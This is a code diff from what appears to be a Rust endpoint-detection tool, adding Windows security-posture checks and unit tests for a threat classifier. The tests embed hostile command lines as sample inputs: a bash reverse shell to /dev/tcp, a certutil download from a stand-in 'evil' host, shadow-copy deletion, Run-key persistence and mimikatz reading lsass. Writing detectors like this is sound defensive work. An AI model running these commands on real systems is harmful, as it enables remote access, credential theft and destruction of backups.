          $ppl = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL; \
          if ($ppl -ne 1) { $out += \"low`tLSASS not a protected process (RunAsPPL off)`tposture`tRunAsPPL=$ppl\" }; \
+         $wd = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name UseLogonCredential -ErrorAction SilentlyContinue).UseLogonCredential; \
+         if ($wd -eq 1) { $out += \"high`tWDigest cleartext credential caching enabled`tposture`tUseLogonCredential=1\" }; \
+         if ($smb -and -not $smb.RequireSecuritySigning) { $out += \"low`tSMB signing not required (AiTM/relay exposure)`tposture`tRequireSecuritySigning=false\" }; \
+         $llmnr = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient' -Name EnableMulticast -ErrorAction SilentlyContinue).EnableMulticast; \
+         if ($llmnr -ne 0) { $out += \"low`tLLMNR enabled (name-resolution poisoning exposure)`tposture`tEnableMulticast=$llmnr\" }; \
+         try { $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace 'root\\Microsoft\\Windows\\DeviceGuard' -ErrorAction Stop; if (-not ($dg.SecurityServicesRunning -contains 1)) { $out += \"low`tCredential Guard not running`tposture`tSecurityServicesRunning=off\" } } catch {}; \
+         try { $bl = Get-BitLockerVolume -MountPoint $env:SystemDrive -ErrorAction Stop; if ($bl.ProtectionStatus -ne 'On') { $out += \"low`tBitLocker not enabled on the system drive`tposture`tProtectionStatus=$($bl.ProtectionStatus)\" } } catch {}; \
+         try { $psv2 = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -ErrorAction Stop; if ($psv2.State -eq 'Enabled') { $out += \"low`tPowerShell v2 engine present (logging bypass)`tposture`tMicrosoftWindowsPowerShellV2=Enabled\" } } catch {}; \
          $out";
     if let Ok(output) = crate::process::run_command(
         "powershell.exe",
@@ -1766,15 +2280,18 @@ mod tests {
     }
 
     #[test]
-    fn classifies_known_reverse_shell_ports() {
-        for port in ["4444", "1337", "31337", "6666", "6667"] {
+    fn classifies_configured_c2_ports() {
+        let c2 = [4444u16, 1337, 31337, 6666, 6667];
+        for port in c2 {
             assert_eq!(
-                classify(&format!(
-                    "remote_port={port}\tremote_addr=203.0.113.9\tproto=tcp"
-                )),
+                classify_line(
+                    "network-outbound",
+                    &format!("remote_port={port}\tremote_addr=203.0.113.9\tproto=tcp"),
+                    &c2,
+                ),
                 Some((
                     "high",
-                    "Outbound connection to a well-known reverse-shell port"
+                    "Outbound connection to a flagged C2/reverse-shell port"
                 )),
                 "port {port} should classify"
             );
@@ -1782,17 +2299,230 @@ mod tests {
     }
 
     #[test]
-    fn does_not_classify_a_similar_but_different_port() {
-        // Regression check: "remote_port=16667" must not match the
-        // "remote_port=6667" needle just because it contains "6667" as a
-        // substring -- the `remote_port=` prefix has to line up exactly.
+    fn c2_port_match_is_exact_not_substring() {
+        let c2 = [1337u16, 6667];
+        // Regression check: port 13370 must NOT match a rule for 1337, and
+        // 16667 must not match 6667 -- the old substring table had exactly this
+        // trailing/leading-digit false-match; exact numeric comparison fixes it.
         assert_eq!(
-            classify("remote_port=16667\tremote_addr=203.0.113.9\tproto=tcp"),
+            classify_line(
+                "network-outbound",
+                "remote_port=13370\tremote_addr=203.0.113.9\tproto=tcp",
+                &c2,
+            ),
             None
         );
         assert_eq!(
-            classify("remote_port=443\tremote_addr=203.0.113.9\tproto=tcp"),
+            classify_line(
+                "network-outbound",
+                "remote_port=16667\tremote_addr=203.0.113.9\tproto=tcp",
+                &c2,
+            ),
             None
+        );
+        // A port that isn't in the set doesn't classify.
+        assert_eq!(
+            classify_line(
+                "network-outbound",
+                "remote_port=443\tremote_addr=203.0.113.9\tproto=tcp",
+                &c2,
+            ),
+            None
+        );
+        // An empty set means no port-based flagging at all.
+        assert_eq!(
+            classify_line(
+                "network-outbound",
+                "remote_port=4444\tremote_addr=203.0.113.9\tproto=tcp",
+                &[],
+            ),
+            None
+        );
+    }
+
+    #[test]
+    fn c2_ports_only_apply_to_outbound_source() {
+        // The same text under a non-network source must never flag as C2 --
+        // the port set only applies to outbound-network lines.
+        assert_eq!(
+            classify_line(
+                "process",
+                "remote_port=4444\tremote_addr=203.0.113.9\tproto=tcp",
+                &[4444],
+            ),
+            None
+        );
+    }
+
+    #[test]
+    fn fast_channel_script_is_offset_free_and_bounded() {
+        let s = windows_fast_channel_script("Security", &[1102, 4688]);
+        assert!(s.contains("Id=1102,4688"));
+        assert!(s.contains("-MaxEvents 50"));
+        // The fast query must NOT track offsets or emit a high-water mark.
+        assert!(!s.contains("MAXRID"));
+        assert!(!s.contains("EventRecordID"));
+    }
+
+    #[test]
+    fn fast_scan_outcome_emits_only_matches_and_no_info_line() {
+        let lines: Vec<(&'static str, String)> = vec![
+            ("process", "nginx: worker process".to_string()),
+            (
+                "process",
+                "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1".to_string(),
+            ),
+        ];
+        let CommandOutcome::Ok(out) = fast_scan_outcome(&lines, &[]) else {
+            panic!("expected Ok");
+        };
+        // Only the reverse-shell line classifies; the benign one is dropped.
+        assert_eq!(out.stdout.lines().count(), 1);
+        assert!(out.stdout.contains("Possible reverse shell"));
+        assert!(!out.stdout.contains("info\t"));
+    }
+
+    #[test]
+    fn parses_outbound_remote_port() {
+        assert_eq!(
+            outbound_remote_port("remote_port=4444\tremote_addr=203.0.113.9\tproto=tcp"),
+            Some(4444)
+        );
+        assert_eq!(
+            outbound_remote_port("remote_addr=203.0.113.9\tproto=tcp"),
+            None
+        );
+        assert_eq!(
+            outbound_remote_port("remote_port=99999\tremote_addr=x"),
+            None
+        );
+    }
+
+    #[test]
+    fn multi_rules_match_case_insensitively_and_require_all_parts() {
+        // certutil download: both parts present -> match; one alone -> no match.
+        assert_eq!(
+            classify("certutil.exe -urlcache -split -f http://evil/x.exe x.exe"),
+            Some(("high", "Ingress tool transfer via certutil"))
+        );
+        assert_eq!(classify("certutil.exe -hashfile x.exe SHA256"), None);
+        // Case-insensitive.
+        assert_eq!(
+            classify("VSSADMIN.EXE Delete Shadows /All /Quiet"),
+            Some((
+                "high",
+                "Shadow copy / backup deletion (ransomware precursor)"
+            ))
+        );
+        assert_eq!(
+            classify("C:\\Windows\\System32\\wbadmin.exe DELETE CATALOG -quiet"),
+            Some((
+                "high",
+                "Shadow copy / backup deletion (ransomware precursor)"
+            ))
+        );
+        assert_eq!(
+            classify(
+                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d evil"
+            ),
+            Some(("medium", "Run-key persistence added via reg.exe"))
+        );
+        // Ordinary command lines stay unclassified.
+        assert_eq!(classify("certutil -store my"), None);
+        assert_eq!(classify("reg query HKLM\\SOFTWARE\\Microsoft"), None);
+    }
+
+    #[test]
+    fn known_c2_pipe_names_classify() {
+        assert_eq!(
+            classify("EventID=17\tTime=t\tIpAddress=\tAccount=\tPipeName: \\msagent_a1b2"),
+            Some(("high", "Known command-and-control named pipe"))
+        );
+        assert_eq!(
+            classify("EventID=18\tTime=t\tIpAddress=\tAccount=\tPipeName: \\postex_ssh_1234"),
+            Some(("high", "Known command-and-control named pipe"))
+        );
+        // An ordinary pipe doesn't match.
+        assert_eq!(
+            classify("EventID=17\tTime=t\tIpAddress=\tAccount=\tPipeName: \\mojo.5688.8east"),
+            None
+        );
+    }
+
+    #[test]
+    fn ancestry_label_flags_suspicious_chains_only() {
+        assert_eq!(
+            ancestry_label("WINWORD.EXE", "powershell.exe"),
+            Some("Office application spawned a command interpreter")
+        );
+        assert_eq!(
+            ancestry_label("excel.exe", "mshta.exe"),
+            Some("Script host or LOLBin spawned by an office/browser process")
+        );
+        assert_eq!(
+            ancestry_label("chrome.exe", "cscript.exe"),
+            Some("Script host or LOLBin spawned by an office/browser process")
+        );
+        assert_eq!(
+            ancestry_label("wmiprvse.exe", "cmd.exe"),
+            Some("Command shell spawned by a long-running service host")
+        );
+        // Ordinary chains are not flagged.
+        assert_eq!(ancestry_label("explorer.exe", "cmd.exe"), None);
+        assert_eq!(ancestry_label("winword.exe", "splwow64.exe"), None);
+    }
+
+    #[test]
+    fn ancestry_findings_resolves_parents_and_dedups() {
+        // pid 100 = winword, pid 200 = powershell (child of 100),
+        // pid 201 = powershell (also child of 100 -> deduped),
+        // pid 300 = explorer, pid 301 = cmd (child of explorer -> benign).
+        let snapshot = vec![
+            (100u32, 1u32, "winword.exe".into(), "WINWORD.EXE /n".into()),
+            (
+                200u32,
+                100u32,
+                "powershell.exe".into(),
+                "powershell -enc ZQBj".into(),
+            ),
+            (
+                201u32,
+                100u32,
+                "powershell.exe".into(),
+                "powershell -w hidden".into(),
+            ),
+            (300u32, 1u32, "explorer.exe".into(), "explorer.exe".into()),
+            (301u32, 300u32, "cmd.exe".into(), "cmd.exe".into()),
+        ];
+        let findings = ancestry_findings(&snapshot);
+        assert_eq!(
+            findings.len(),
+            1,
+            "winword->powershell once, explorer->cmd never"
+        );
+        assert!(findings[0].starts_with(
+            "high\tOffice application spawned a command interpreter\tprocess-ancestry\t"
+        ));
+        assert!(findings[0].contains("parent=winword.exe child=powershell.exe"));
+    }
+
+    #[test]
+    fn lsass_access_finding_flags_memory_read_of_lsass_only() {
+        assert!(
+            lsass_access_finding(
+                "C:\\temp\\mimikatz.exe",
+                "C:\\Windows\\System32\\lsass.exe",
+                "0x1410"
+            )
+            .is_some()
+        );
+        // Wrong target.
+        assert!(
+            lsass_access_finding("x.exe", "C:\\Windows\\System32\\notepad.exe", "0x1410").is_none()
+        );
+        // Target lsass but benign (query-only) access mask.
+        assert!(
+            lsass_access_finding("x.exe", "C:\\Windows\\System32\\lsass.exe", "0x1000").is_none()
         );
     }
 
